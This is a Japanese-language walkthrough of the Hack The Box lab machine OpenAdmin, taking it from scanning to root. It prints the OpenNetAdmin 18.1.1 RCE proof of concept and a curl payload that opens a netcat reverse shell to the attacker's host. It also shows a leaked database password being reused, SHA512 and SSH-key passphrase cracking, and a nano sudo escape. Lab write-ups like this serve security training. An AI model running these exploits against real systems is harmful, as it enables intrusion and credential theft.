https://app.hackthebox.com/machines/OpenAdmin

## STEP 1
```sh
└─$ rustscan -a 10.129.5.45 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.5.45:22
Open 10.129.5.45:80
10.129.5.45 -> [22,80]
```


## STEP 2
80番にアクセス、Apacheのデフォルトページっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_01.png">  
列挙
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.5.45/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.5.45/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

music                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 433ms]
artwork                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 434ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 278ms]
sierra                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 466ms]
:: Progress: [29999/29999] :: Job [1/1] :: 95 req/sec :: Duration: [0:04:13] :: Errors: 1 ::
```
musicのログインページから、列挙で見つけれなかったサイトを発見  
OpenNetAdminというやつが使われているっぽい
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_02.png">  



## STEP 3
opennetadmin 18.1.1 には CVE-2019-25065 が存在しRCEの脆弱性がある  
searchsploitでPoCを発見
```sh
└─$ searchsploit -m 47691
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/kali/htb/47691.sh
```
PoCの使い方はURLを引数にする必要あり  
ただリバースシェルをとるのではなく毎度コマンドをRCEで実行しているぽい、手動でエクスプロイト
```sh
└─$ cat 47691.sh                                                   
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
PoCのcurlをぱくって、RCE
```sh
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";busybox nc 10.10.14.70 4444 -e /bin/bash;echo \"END\"&xajaxargs[]=ping" http://10.129.5.45/ona/login.php 
^C
```
リバースシェル取得  
がユーザフラグすら権限拒否
```sh
└─$ nc -lnvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.5.45] 32810

python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@openadmin:/opt/ona/www$ ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444
                               ^C

www-data@openadmin:/opt/ona/www$ export SHELL=bash

www-data@openadmin:/opt/ona/www$ export TERM=xterm-256color

www-data@openadmin:/opt/ona/www$ stty rows 66 columns 236

www-data@openadmin:/opt/ona/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@openadmin:/opt/ona/www$ ls -l /home
total 8
drwxr-x--- 5 jimmy  jimmy  4096 Nov 22  2019 jimmy
drwxr-x--- 5 joanna joanna 4096 Jul 27  2021 joanna
```


## STEP 4
ffufで列挙した以外のwebサイトがあるっぽい
```sh
www-data@openadmin:/opt/ona/www$ ls /var/www/html
artwork  index.html  marga  music  ona  sierra
```
他にもinternalフォルダがあるが、jimmyユーザ・internalグループ以外は確認できない
```sh
www-data@openadmin:/opt/ona/www$ ls -l /var/www/
total 8
drwxr-xr-x 6 www-data www-data 4096 Nov 22  2019 html
drwxrwx--- 2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx 1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```
STEP2のonaのサイトを見たところ、dbとの接続がありそうなかんじ  
ona配下のディレクトリを探索するとdbのパスワードを発見
```sh
www-data@openadmin:/opt/ona/www$ cat /var/www/html/ona/local/config/database_settings.inc.php
<www/html/ona/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
パスワードの使いまわしをしてるかな  
してました、jimmyでログイン成功
```
www-data@openadmin:/opt/ona/www$ su jimmy
Password: 

jimmy@openadmin:/opt/ona/www$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```
internalフォルダを確認
```sh
jimmy@openadmin:/opt/ona/www$ ls -l /var/www/internal
total 12
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```
internalのwebサイトをブラウザ上で確認したい  
`/etc/apache2/sites-enabled/`配下のconfファイルで、各webサイトの設定を確認できる  
internalは、127.0.0.1の52846番でリスニングされているらしい
```sh
jimmy@openadmin:/opt/ona/www$ cat /etc/apache2/sites-enabled/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
sshローカルポートフォワーディングで、kaliの52846番ポートとターゲットの52846番ポートを結ぶ
```sh
└─$ ssh -L 52846:localhost:52846 jimmy@10.129.246.252
The authenticity of host '10.129.246.252 (10.129.246.252)' can't be established.
ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.246.252' (ED25519) to the list of known hosts.
jimmy@10.129.246.252's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun  5 01:59:28 UTC 2025

  System load:  0.24              Processes:             179
  Usage of /:   30.8% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.129.246.252
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$
```
52846番ポートアクセス成功  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_03.png">  


## STEP 5
ログインページのソース、index.phpを確認
```php
jimmy@openadmin:/opt/ona/www$ cat /var/www/internal/index.php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```
ユーザ名 jimmy のパスワードハッシュを確認することができた  
またクレデンシャルが正しい場合、main.phpにリダイレクトされるっぽい
```php
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
  if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
      $_SESSION['username'] = 'jimmy';
      header("Location: /main.php");
```
main.phpを確認すると、ユーザ名 joanna のssh秘密鍵を表示するっぽい
```php
jimmy@openadmin:/opt/ona/www$ cat /var/www/internal/main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
sha512のハッシュ値をクラックすることができた、web上での jimmy のパスワードは Revealed  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_04.png">


## STEP 6
ログイン成功、joannnaの秘密鍵ゲット～  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_05.png">  
秘密鍵でsshログインしようとしたが、パスフレーズがいるもよう
```
└─$ chmod 0600 id_rsa 

└─$ ssh -i id_rsa joanna@10.129.246.252
Enter passphrase for key 'id_rsa':
```
`ssh2john`でパスフレーズのハッシュを抽出しクラック  
パスフレーズは bloodninjas と判明
```sh
└─$ ssh2john id_rsa > id_rsa.txt
                                                                                                                                                                                                                                            
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  id_rsa.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)     
1g 0:00:00:03 DONE (2025-06-05 02:33) 0.3300g/s 3159Kp/s 3159Kc/s 3159KC/s bloodninjas..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
`openssl`でパスフレーズを解除した秘密鍵でsshログイン成功！  
ユーザフラグゲット！ルートフラグは権限拒否
```sh
└─$ openssl rsa -in id_rsa -out id_rsa_joanna
Enter pass phrase for id_rsa:
writing RSA key

└─$ ssh -i id_rsa_joannna joanna@10.129.246.252
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun  5 04:11:38 UTC 2025

  System load:  0.0               Processes:             183
  Usage of /:   30.9% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.129.246.252
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15

joanna@openadmin:~$ cat user.txt
82af7fd85bec5082d6ea0cf6b62f3929

joanna@openadmin:~$ ls /root
ls: cannot open directory '/root': Permission denied
```


## STEP 7
`/bin/nano /opt/priv`がパスワードなしで実行できる
```sh
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
[リンク](https://gtfobins.github.io/gtfobins/nano/#sudo)どおりで権限昇格  
実行するとnanoが開いた、nano上でコマンド実行する  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_06.png">  
「Ctrl+r」からの「Ctrl+x」で次の画面、`reset; /bin/sh 1>&0 2>&0`をコマンド実行  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_07.png">  
すこし画面がバグるが、rootシェルを開くことができた  
ルートフラグゲット！  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_08.png">  
